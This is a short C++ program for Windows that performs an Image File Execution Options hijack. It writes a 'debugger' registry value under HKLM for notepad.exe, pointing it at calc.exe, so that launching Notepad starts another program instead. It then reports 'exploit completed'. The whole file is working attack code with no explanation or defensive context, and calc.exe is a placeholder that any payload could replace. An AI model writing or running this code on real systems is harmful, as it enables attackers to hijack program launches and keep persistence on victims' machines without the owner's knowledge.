#include <windows.h>
#include <iostream>
template <typename ... T>
__forceinline void print_bad(const char* format, T const& ... args)
{
    printf("[!] ");
    printf(format, args ...);
}

template <typename ... T>
__forceinline void print_good(const char* format, T const& ... args)
{
    printf("[+] ");
    printf(format, args ...);
}

void IFXOI(void)
{
    HKEY hKey;
    LPCTSTR value = TEXT("debugger");
    WCHAR path[80] = TEXT("calc.exe");
    LPCTSTR sk = TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe");
    LONG openRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sk, 0, KEY_ALL_ACCESS, &hKey);
    (openRes == ERROR_SUCCESS) ? print_good("registry key opened Successfully\n") : print_bad("Error while opening Registry key\n");
    LONG setRes = RegSetValueEx(hKey, value, 0, REG_SZ, (LPBYTE)path, sizeof(path));
    (setRes == ERROR_SUCCESS) ? print_good("Success writing to Registry.\n") : print_bad("Error writing to Registry.\n");
    LONG closeOut = RegCloseKey(hKey);
    (closeOut == ERROR_SUCCESS) ? print_good("exploit completed\n") : print_bad("error while closing Reg key\n");
}
int main()
{
    IFXOI();
}